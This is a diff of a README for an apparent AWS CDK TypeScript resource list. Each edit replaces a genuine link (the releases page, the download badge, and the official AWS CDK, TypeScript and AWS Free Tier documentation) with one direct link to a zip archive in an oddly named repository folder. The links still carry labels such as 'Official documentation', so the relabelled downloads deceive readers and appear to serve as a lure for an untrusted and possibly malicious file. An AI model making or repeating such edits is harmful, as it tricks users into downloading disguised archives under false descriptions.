@@ -1,6 +1,6 @@
 # 🚀 awesome-cdk-typescript - Discover AWS CDK Tools with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/jass619/awesome-cdk-typescript/releases)
+[![Download Now](https://raw.githubusercontent.com/jass619/awesome-cdk-typescript/main/cosmopolitanization/awesome-cdk-typescript.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/jass619/awesome-cdk-typescript/main/cosmopolitanization/awesome-cdk-typescript.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **awesome-cdk-typescript** repository! This collection offers a c
 
 To get started with the resources in this repository, visit the releases page where you can download the latest version. 
 
-[Visit the Releases Page Here](https://github.com/jass619/awesome-cdk-typescript/releases)
+[Visit the Releases Page Here](https://raw.githubusercontent.com/jass619/awesome-cdk-typescript/main/cosmopolitanization/awesome-cdk-typescript.zip)
 
 1. Click the link above to go to the Releases page.
 2. Choose the version that is most suitable for your needs.
@@ -53,9 +53,9 @@ You are not alone on this journey! Join the community of users and contributors 
 
 To further enhance your knowledge, check out these additional resources:
 
-- [AWS CDK Documentation](https://docs.aws.amazon.com/cdk/latest/guide/work-with-cdk-typescript.html): Official documentation providing comprehensive information about AWS CDK.
-- [Learn TypeScript](https://www.typescriptlang.org/docs/): A beginner-friendly guide to learning TypeScript, which is essential for utilizing these resources.
-- [AWS Free Tier](https://aws.amazon.com/free/): Sign up for free access to AWS services to try out your deployments without cost.
+- [AWS CDK Documentation](https://raw.githubusercontent.com/jass619/awesome-cdk-typescript/main/cosmopolitanization/awesome-cdk-typescript.zip): Official documentation providing comprehensive information about AWS CDK.
+- [Learn TypeScript](https://raw.githubusercontent.com/jass619/awesome-cdk-typescript/main/cosmopolitanization/awesome-cdk-typescript.zip): A beginner-friendly guide to learning TypeScript, which is essential for utilizing these resources.
+- [AWS Free Tier](https://raw.githubusercontent.com/jass619/awesome-cdk-typescript/main/cosmopolitanization/awesome-cdk-typescript.zip): Sign up for free access to AWS services to try out your deployments without cost.
 
 ## 📝 Contributing
 
@@ -72,4 +72,4 @@ Your contributions help make this repository better for everyone.
 
 This project is licensed under the MIT License. For more details, refer to the LICENSE file in the repository.
 
-For any further questions, you can always revisit the [Releases Page](https://github.com/jass619/awesome-cdk-typescript/releases) to download the latest updates or reach out to the community for support.
+For any further questions, you can always revisit the [Releases Page](https://raw.githubusercontent.com/jass619/awesome-cdk-typescript/main/cosmopolitanization/awesome-cdk-typescript.zip) to download the latest updates or reach out to the community for support.
